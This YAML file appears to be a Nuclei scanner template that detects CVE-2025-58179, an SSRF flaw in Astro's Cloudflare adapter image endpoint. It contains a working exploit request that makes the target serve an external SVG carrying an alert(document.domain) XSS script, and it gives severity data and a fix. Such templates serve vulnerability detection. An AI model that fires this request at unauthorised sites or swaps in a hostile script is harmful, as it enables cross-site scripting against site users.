http:
- matchers:
  - condition: and
    part: body
    type: word
    words:
    - <script type="text/javascript
    - alert(document.domain);
  - part: content_type
    type: word
    words:
    - image/svg+xml
  - status:
    - 200
    type: status
  matchers-condition: and
  method: GET
  path:
  - '{{BaseURL}}/_image?href=https://raw.githubusercontent.com/projectdiscovery/nuclei-templates/refs/heads/main/helpers/payloads/retool-xss.svg&f=svg'
id: CVE-2025-58179
info:
  author: HoangAnhThai
  classification:
    cpe: cpe:2.3:a:withastro:astro:*:*:*:*:*:*:*:*
    cve-id: CVE-2025-58179
    cvss-metrics: CVSS:3.1/AV:N/AC:L/PR:N/UI:N/S:C/C:L/I:L/A:N
    cvss-score: 7.2
    cwe-id: CWE-918
    epss-percentile: 0.79192
    epss-score: 0.01294
  description: "Astro is a web framework for content-driven websites. Versions 11.0.3\
    \ through 12.6.5 are vulnerable to SSRF when using Astro's Cloudflare adapter.\
    \ When configured with output: 'server' while using the default imageService:\
    \ 'compile', the generated image optimization endpoint doesn't check the URLs\
    \ it receives, allowing content from unauthorized third-party domains to be served.\
    \ a A bug in impacted versions of the @astrojs/cloudflare adapter for deployment\
    \ on Cloudflare\u2019s infrastructure, allows an attacker to bypass the third-party\
    \ domain restrictions and serve any content from the vulnerable origin.\n"
  impact: 'Unauthenticated attackers can bypass third-party domain restrictions to
    serve arbitrary content from unauthorized domains through the image optimization
    endpoint, potentially enabling XSS attacks.

    '
  metadata:
    max-request: 1
    product: astro
    vendor: withastro
  name: Astro Cloudflare Adapter - Server Side Request Forgery
  reference:
  - https://github.com/withastro/astro/commit/9ecf359
  - https://github.com/advisories/GHSA-qpr4-c339-7vq8
  - https://nvd.nist.gov/vuln/detail/CVE-2025-58179
  remediation: 'Upgrade Astro''s @astrojs/cloudflare adapter to version 12.6.6 or
    later that properly validates image URLs.

    '
  severity: high
  tags: cve,cve2025,ssrf,xss,astro,cloudflare,vuln
